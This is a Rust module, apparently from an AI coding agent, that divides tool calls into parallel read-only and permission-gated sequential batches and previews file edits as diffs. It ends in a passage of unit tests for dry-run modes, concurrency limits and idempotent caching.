//! Tool executor: partitions tools by permission level and executes them.
//!
//! ## Module structure
//!
//! - `mod.rs`        — Public API: `plan_execution()`, shared types, re-exports
//! - `pipeline.rs`   — Single-tool execution pipeline (9-stage lifecycle)
//! - `parallel.rs`   — `execute_parallel_batch()` for ReadOnly/concurrent tools
//! - `sequential.rs` — `execute_sequential_tool()` for gated Destructive tools
//! - `validation.rs` — `validate_tool_args()`, path resolution, schema checks (pure, no I/O)
//! - `retry.rs`      — Unified retry: classification + backoff + mutations + repair
//! - `hooks.rs`      — Pre/post tool hook integration

pub(crate) mod hooks;
pub(crate) mod parallel;
pub(crate) mod pipeline;
pub(crate) mod retry;
pub(crate) mod sequential;
pub(crate) mod validation;

// Re-export public API (preserves backward compatibility)
pub use parallel::execute_parallel_batch;
pub use retry::{classify_error, is_deterministic_error, is_transient_error};
pub use sequential::execute_sequential_tool;

// Re-export pipeline items used by parallel.rs, sequential.rs, and tests
pub(crate) use pipeline::{execute_one_tool, make_error_result};

// Re-export submodule items used by tests (super::* pattern)
#[cfg(test)]
pub(crate) use retry::{jittered_delay, run_with_retry};
#[cfg(test)]
pub(crate) use validation::{
    extract_path_args, pre_validate_path_args, resolve_to_absolute, suggest_similar_path,
    validate_tool_args,
};

#[cfg(test)]
use std::time::Duration;

#[cfg(test)]
use halcon_core::types::ToolInput;
use halcon_core::types::ToolRetryConfig;
use halcon_core::types::{ContentBlock, PermissionLevel};
use halcon_tools::ToolRegistry;

use super::accumulator::CompletedToolUse;
#[cfg(test)]
use super::conversational_permission::ConversationalPermissionHandler;
use super::idempotency::DryRunMode;
use crate::render::diff::{compute_ai_diff, render_file_diff};

// Re-export for test visibility (tests use super::*)
#[allow(unused_imports)]
use halcon_storage::AsyncDatabase;

/// Configuration for tool execution (dry-run + idempotency).
///
/// Introduced in Phase 16 to avoid cascading parameter changes.
/// Pass `&ToolExecutionConfig::default()` for normal execution.
pub struct ToolExecutionConfig<'a> {
    /// Dry-run mode controls which tools are actually executed.
    pub dry_run_mode: DryRunMode,
    /// Optional idempotency registry for deduplicating identical tool calls.
    /// Wired in Sub-Phase 16.1.
    pub idempotency: Option<&'a super::idempotency::IdempotencyRegistry>,
    /// Tool retry configuration for transient failures.
    pub retry: ToolRetryConfig,
    /// Optional lifecycle hook runner (Feature 2).
    ///
    /// When `Some`, fires `PreToolUse` hooks before execution and
    /// `PostToolUse` / `PostToolUseFailure` hooks after execution.
    /// When `None` (default), no hooks run.
    pub hook_runner: Option<std::sync::Arc<super::hooks::HookRunner>>,
    /// Session ID passed to hook environment variables.
    pub session_id_str: String,
    /// Session-scoped tools injected at runtime (e.g., `search_memory` when
    /// `enable_semantic_memory = true`).  Checked as a fallback when the tool
    /// name is not found in the primary `ToolRegistry`.
    pub session_tools: Vec<std::sync::Arc<dyn halcon_core::traits::Tool>>,
    /// Optional unified trace recorder. When `Some`, parallel/sequential executors
    /// use fire-and-forget recording instead of inline DB writes.
    pub trace_recorder: Option<super::trace_recording::TraceRecorder>,
    /// Maximum seconds to wait for an interactive permission prompt before auto-denying.
    /// `None` or `Some(0)` = unlimited (legacy behavior).
    /// Resolves: CR-2 (unbounded permission wait).
    pub permission_timeout_secs: Option<u64>,
}

impl Default for ToolExecutionConfig<'_> {
    fn default() -> Self {
        Self {
            dry_run_mode: DryRunMode::Off,
            idempotency: None,
            retry: ToolRetryConfig::default(),
            hook_runner: None,
            session_id_str: String::new(),
            session_tools: Vec::new(),
            trace_recorder: None,
            permission_timeout_secs: None,
        }
    }
}

/// Result of executing one tool.
pub struct ToolExecResult {
    pub tool_use_id: String,
    pub tool_name: String,
    pub content_block: ContentBlock,
    pub duration_ms: u64,
    pub was_parallel: bool,
}

/// Plan for executing a batch of tools.
pub struct ToolExecutionPlan {
    /// ReadOnly tools that can be executed concurrently.
    pub parallel_batch: Vec<CompletedToolUse>,
    /// Tools that require sequential execution (permission prompt or destructive).
    pub sequential_batch: Vec<CompletedToolUse>,
}

/// Canonicalize a tool name via alias mapping.
///
/// Single source of truth — all modules use this instead of reaching into
/// `super::tool_aliases` directly. Eliminates `super::super::` coupling.
pub(crate) fn canonicalize_name<'a>(name: &'a str) -> &'a str {
    super::tool_aliases::canonicalize(name)
}

/// Resolve a tool from the registry with alias fallback.
///
/// Single source of truth for tool resolution. Replaces duplicated
/// resolution logic in plan_execution, check_tool_known, parallel, sequential.
pub(crate) fn resolve_tool_from_registry(
    name: &str,
    registry: &ToolRegistry,
) -> Option<std::sync::Arc<dyn halcon_core::traits::Tool>> {
    let canonical = canonicalize_name(name);
    registry
        .get(name)
        .or_else(|| registry.get(canonical))
        .cloned()
}

/// Partition completed tool uses into parallel and sequential batches.
pub fn plan_execution(tools: Vec<CompletedToolUse>, registry: &ToolRegistry) -> ToolExecutionPlan {
    let mut parallel = Vec::new();
    let mut sequential = Vec::new();

    for tool_call in tools {
        let can_parallel = match resolve_tool_from_registry(&tool_call.name, registry) {
            Some(tool) => tool.permission_level() == PermissionLevel::ReadOnly,
            None => false, // Unknown tools go sequential (will produce error).
        };

        if can_parallel {
            parallel.push(tool_call);
        } else {
            sequential.push(tool_call);
        }
    }

    ToolExecutionPlan {
        parallel_batch: parallel,
        sequential_batch: sequential,
    }
}

/// Build a synthetic dry-run result for a tool that was skipped.
fn synthetic_dry_run_result(tool_call: &CompletedToolUse) -> ToolExecResult {
    ToolExecResult {
        tool_use_id: tool_call.id.clone(),
        tool_name: tool_call.name.clone(),
        content_block: ContentBlock::ToolResult {
            tool_use_id: tool_call.id.clone(),
            content: format!(
                "[dry-run] Tool '{}' skipped (would execute with: {})",
                tool_call.name,
                serde_json::to_string(&tool_call.input).unwrap_or_default(),
            ),
            is_error: false,
        },
        duration_ms: 0,
        was_parallel: false,
    }
}

// is_transient_error moved to retry.rs, re-exported above

// is_deterministic_error moved to retry.rs, re-exported above

// mutate_args_for_retry moved to retry.rs

/// Generate diff preview for file_edit operations.
///
/// Returns (path, added_lines, deleted_lines) if successful, None otherwise.
/// Writes the unified diff to stderr for user review before permission prompt.
fn generate_file_edit_preview(input: &serde_json::Value) -> Option<(String, usize, usize)> {
    use std::io::Write;

    let path = input.get("path")?.as_str()?;
    let old_string = input.get("old_string")?.as_str()?;
    let new_string = input.get("new_string")?.as_str()?;
    let replace_all = input
        .get("replace_all")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    // Read current file
    let old_content = match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!("Failed to read file for diff preview: {}", e);
            eprintln!("\n⚠️  [file not readable - diff preview unavailable]\n");
            return None;
        }
    };

    // Binary detection
    if old_content.contains('\0') {
        eprintln!("\n⚠️  [binary file - diff preview unavailable]\n");
        return None;
    }

    // Apply replacement (same logic as file_edit tool)
    let new_content = if replace_all {
        old_content.replace(old_string, new_string)
    } else {
        old_content.replacen(old_string, new_string, 1)
    };

    // No changes
    if old_content == new_content {
        eprintln!("\n⚠️  [no changes detected - replacement string not found]\n");
        return None;
    }

    // Compute diff
    let diff = compute_ai_diff(path, &old_content, &new_content);

    // Extract stats
    let added = diff.added;
    let deleted = diff.deleted;

    // Render to stderr (render_file_diff writes directly)
    let mut preview = Vec::new();
    render_file_diff(&diff, &mut preview);

    // Write to stderr
    if let Err(e) = std::io::stderr().write_all(&preview) {
        tracing::warn!("Failed to write diff to stderr: {}", e);
        return None;
    }

    // Flush to ensure it appears before the permission prompt
    let _ = std::io::stderr().flush();

    Some((path.to_string(), added, deleted))
}

// Pipeline internals (execute_one_tool, check_*, record_*) → pipeline.rs
// Parallel batch execution → parallel.rs
// Sequential tool execution → sequential.rs

// ─────────────────────────────────────────────────────────────────────────────
#[cfg(test)]
mod tests {
    use super::*;
    use crate::render::sink::SilentSink;

    static TEST_SINK: std::sync::LazyLock<SilentSink> = std::sync::LazyLock::new(SilentSink::new);

    fn make_completed(id: &str, name: &str) -> CompletedToolUse {
        CompletedToolUse {
            id: id.to_string(),
            name: name.to_string(),
            input: serde_json::json!({}),
        }
    }

    #[test]
    fn plan_partitions_readonly_vs_destructive() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tools = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "bash"),
            make_completed("t3", "grep"),
            make_completed("t4", "file_write"),
        ];

        let plan = plan_execution(tools, &registry);

        // file_read and grep are ReadOnly -> parallel
        let par_names: Vec<&str> = plan
            .parallel_batch
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        assert!(par_names.contains(&"file_read"));
        assert!(par_names.contains(&"grep"));

        // bash is Destructive, file_write is Destructive -> sequential
        let seq_names: Vec<&str> = plan
            .sequential_batch
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        assert!(seq_names.contains(&"bash"));
        assert!(seq_names.contains(&"file_write"));
    }

    #[test]
    fn plan_unknown_tool_goes_sequential() {
        let registry = ToolRegistry::new();

        let tools = vec![make_completed("t1", "nonexistent_tool")];
        let plan = plan_execution(tools, &registry);

        assert!(plan.parallel_batch.is_empty());
        assert_eq!(plan.sequential_batch.len(), 1);
    }

    #[test]
    fn plan_all_readonly_all_parallel() {
        let registry = halcon_tools::default_registry(&Default::default());

        let tools = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "glob"),
            make_completed("t3", "grep"),
        ];

        let plan = plan_execution(tools, &registry);
        assert_eq!(plan.parallel_batch.len(), 3);
        assert!(plan.sequential_batch.is_empty());
    }

    #[test]
    fn plan_all_destructive_all_sequential() {
        let registry = halcon_tools::default_registry(&Default::default());

        let tools = vec![
            make_completed("t1", "bash"),
            make_completed("t2", "file_write"),
            make_completed("t3", "file_edit"),
        ];

        let plan = plan_execution(tools, &registry);
        assert!(plan.parallel_batch.is_empty());
        assert_eq!(plan.sequential_batch.len(), 3);
    }

    #[test]
    fn plan_empty_input() {
        let registry = ToolRegistry::new();

        let plan = plan_execution(vec![], &registry);
        assert!(plan.parallel_batch.is_empty());
        assert!(plan.sequential_batch.is_empty());
    }

    #[tokio::test]
    async fn execute_parallel_batch_empty_returns_empty() {
        let registry = ToolRegistry::new();
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let results = execute_parallel_batch(
            &[],
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert!(results.is_empty());
    }

    #[tokio::test]
    async fn execute_parallel_batch_unknown_tool() {
        let registry = ToolRegistry::new();
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![make_completed("t1", "nonexistent")];
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert_eq!(results.len(), 1);
        match &results[0].content_block {
            ContentBlock::ToolResult {
                is_error, content, ..
            } => {
                assert!(is_error);
                assert!(content.contains("unknown tool"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn parallel_results_sorted_by_id() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![
            make_completed("z_last", "file_read"),
            make_completed("a_first", "file_read"),
            make_completed("m_middle", "file_read"),
        ];

        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert_eq!(results.len(), 3);
        assert_eq!(results[0].tool_use_id, "a_first");
        assert_eq!(results[1].tool_use_id, "m_middle");
        assert_eq!(results[2].tool_use_id, "z_last");
    }

    #[tokio::test]
    async fn parallel_results_marked_as_parallel() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![make_completed("t1", "file_read")];
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert!(results[0].was_parallel);
    }

    #[tokio::test]
    async fn parallel_batch_with_trace_recording() {
        use halcon_storage::Database;
        use std::sync::Arc;

        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let db = AsyncDatabase::new(Arc::new(Database::open_in_memory().unwrap()));
        let session_id = uuid::Uuid::new_v4();
        let mut idx = 0u32;

        let batch = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "grep"),
        ];

        execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            Some(&db),
            session_id,
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        // Should have recorded: 1 batch step + 2 individual result steps = 3.
        let steps = db.inner().load_trace_steps(session_id).unwrap();
        assert_eq!(steps.len(), 3);
        // First step is the batch metadata.
        assert!(steps[0].data_json.contains("parallel_batch"));
    }

    #[tokio::test]
    async fn parallel_concurrency_limit_enforced() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        // Create a large batch (20 tools) with concurrency cap of 10.
        let batch: Vec<_> = (0..20)
            .map(|i| make_completed(&format!("t{}", i), "file_read"))
            .collect();

        let start = std::time::Instant::now();
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(30),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10, // Concurrency cap of 10
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        // All 20 tools should complete.
        assert_eq!(results.len(), 20);
        // All should have tool_use_ids and results.
        assert!(results.iter().all(|r| !r.tool_use_id.is_empty()));
        assert!(results.iter().all(|r| r.tool_name == "file_read"));
        // Execution should complete (buffer_unordered prevents stall).
        assert!(start.elapsed().as_secs() < 25);
    }

    #[tokio::test]
    async fn parallel_concurrency_cap_zero_defaults_to_one() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "file_read"),
        ];

        // max_parallel_tools=0 should default to 1 (no panic, still completes).
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            0, // 0 defaults to 1
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert_eq!(results.len(), 2);
        assert!(results.iter().all(|r| r.was_parallel));
    }

    // --- Sub-Phase 16.0: Dry-run mode tests ---

    #[tokio::test]
    async fn dry_run_off_executes_normally() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        // file_read on non-existent path produces an error, but it DID execute (not a dry-run skip).
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(
                    !content.contains("[dry-run]"),
                    "Off mode should execute normally"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_full_skips_all_tools() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Full,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        match &result.content_block {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => {
                assert!(content.contains("[dry-run]"));
                assert!(content.contains("file_read"));
                assert!(!is_error);
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_full_returns_synthetic_result() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "bash");
        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Full,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert_eq!(result.duration_ms, 0);
        assert_eq!(result.tool_name, "bash");
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(content.contains("[dry-run]"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_destructive_only_skips_bash() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "bash");
        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::DestructiveOnly,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(
                    content.contains("[dry-run]"),
                    "bash should be skipped in DestructiveOnly mode"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_destructive_only_allows_read_file() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::DestructiveOnly,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(
                    !content.contains("[dry-run]"),
                    "file_read should execute in DestructiveOnly mode"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn synthetic_result_contains_tool_name() {
        let tool = make_completed("t1", "file_write");
        let result = synthetic_dry_run_result(&tool);
        assert_eq!(result.tool_name, "file_write");
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(content.contains("file_write"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn synthetic_result_is_not_error() {
        let tool = make_completed("t1", "bash");
        let result = synthetic_dry_run_result(&tool);
        match &result.content_block {
            ContentBlock::ToolResult { is_error, .. } => {
                assert!(!is_error);
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn tool_execution_config_default_is_off() {
        let config = ToolExecutionConfig::default();
        assert_eq!(config.dry_run_mode, DryRunMode::Off);
        assert!(config.idempotency.is_none());
    }

    #[tokio::test]
    async fn execute_parallel_with_dry_run_full() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "grep"),
        ];

        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Full,
            idempotency: None,
            ..Default::default()
        };

        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &config,
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert_eq!(results.len(), 2);
        for result in &results {
            match &result.content_block {
                ContentBlock::ToolResult { content, .. } => {
                    assert!(content.contains("[dry-run]"));
                }
                _ => panic!("expected ToolResult"),
            }
        }
    }

    #[tokio::test]
    async fn execute_sequential_with_dry_run_full() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;
        let mut perms = ConversationalPermissionHandler::new(true);

        let tool = make_completed("t1", "bash");
        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Full,
            idempotency: None,
            ..Default::default()
        };

        let result = execute_sequential_tool(
            &tool,
            &registry,
            &mut perms,
            None, // permission_pipeline (tests use legacy path)
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            &config,
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        match &result.content_block {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => {
                assert!(content.contains("[dry-run]"));
                assert!(!is_error);
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn execute_sequential_with_dry_run_destructive_only() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;
        let mut perms = ConversationalPermissionHandler::new(true);

        // file_write is Destructive — should be skipped in DestructiveOnly mode.
        let tool = make_completed("t1", "file_write");
        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::DestructiveOnly,
            idempotency: None,
            ..Default::default()
        };

        let result = execute_sequential_tool(
            &tool,
            &registry,
            &mut perms,
            None, // permission_pipeline (tests use legacy path)
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            &config,
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(content.contains("[dry-run]"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn tool_execution_config_with_idempotency_none() {
        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Off,
            idempotency: None,
            ..Default::default()
        };
        assert_eq!(config.dry_run_mode, DryRunMode::Off);
        assert!(config.idempotency.is_none());
    }

    // --- Sub-Phase 16.1: Idempotency tests ---

    #[tokio::test]
    async fn idempotency_deduplicates_identical_tool_call() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/nonexistent_test_file_abc123"}),
        };

        // First call: executes and records.
        let r1 = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert_eq!(idem.len(), 1);

        // Second call with same args: returns cached result.
        let r2 = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert_eq!(idem.len(), 1); // No new record.

        // Both should have the same content.
        let c1 = match &r1.content_block {
            ContentBlock::ToolResult { content, .. } => content.clone(),
            _ => String::new(),
        };
        let c2 = match &r2.content_block {
            ContentBlock::ToolResult { content, .. } => content.clone(),
            _ => String::new(),
        };
        assert_eq!(c1, c2);
    }

    #[tokio::test]
    async fn idempotency_different_args_not_cached() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool1 = CompletedToolUse {
            id: "t1".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/aaa"}),
        };
        let tool2 = CompletedToolUse {
            id: "t2".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/bbb"}),
        };

        execute_one_tool(
            &tool1,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        execute_one_tool(
            &tool2,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert_eq!(idem.len(), 2); // Two distinct entries.
    }

    #[tokio::test]
    async fn idempotency_records_after_execution() {
        use crate::repl::idempotency::{compute_execution_id, IdempotencyRegistry};

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = make_completed("t1", "file_read");
        let exec_id = compute_execution_id("file_read", &serde_json::json!({}), "");

        assert!(idem.lookup(&exec_id).is_none());
        execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert!(idem.lookup(&exec_id).is_some());
    }

    #[tokio::test]
    async fn idempotency_returns_cached_content() {
        use crate::repl::idempotency::{ExecutionRecord, IdempotencyRegistry};

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        // Pre-seed the registry with a fake cached result.
        let exec_id =
            crate::repl::idempotency::compute_execution_id("file_read", &serde_json::json!({}), "");
        idem.record(ExecutionRecord {
            execution_id: exec_id,
            tool_name: "file_read".to_string(),
            result_content: "cached output".to_string(),
            is_error: false,
            executed_at: chrono::Utc::now(),
        });

        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert_eq!(content, "cached output");
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn idempotency_none_executes_normally() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        // No idempotency (None) — should execute normally.
        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(!content.contains("cached output"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn idempotency_registry_survives_multiple_rounds() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = make_completed("t1", "file_read");
        // Round 1.
        execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        // Round 2 (same tool).
        execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        // Round 3 (same tool).
        execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert_eq!(idem.len(), 1); // Still just 1 entry.
    }

    #[tokio::test]
    async fn idempotency_with_dry_run_no_record() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = make_completed("t1", "file_read");
        // Dry-run full: should NOT record to idempotency (tool didn't execute).
        execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Full,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert!(
            idem.is_empty(),
            "dry-run should not record to idempotency registry"
        );
    }

    #[tokio::test]
    async fn idempotency_error_result_also_cached() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        // file_read on non-existent path → error result.
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/nonexistent_xyz_987654"}),
        };
        let r1 = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        assert_eq!(idem.len(), 1);

        // Second call returns cached error.
        let r2 = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            Some(&idem),
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;
        let e1 =
            matches!(&r1.content_block, ContentBlock::ToolResult { is_error, .. } if *is_error);
        let e2 =
            matches!(&r2.content_block, ContentBlock::ToolResult { is_error, .. } if *is_error);
        assert_eq!(e1, e2);
    }

    #[test]
    fn compute_execution_id_in_executor_matches() {
        use crate::repl::idempotency::compute_execution_id;
        let id1 = compute_execution_id("bash", &serde_json::json!({"cmd": "ls"}), "");
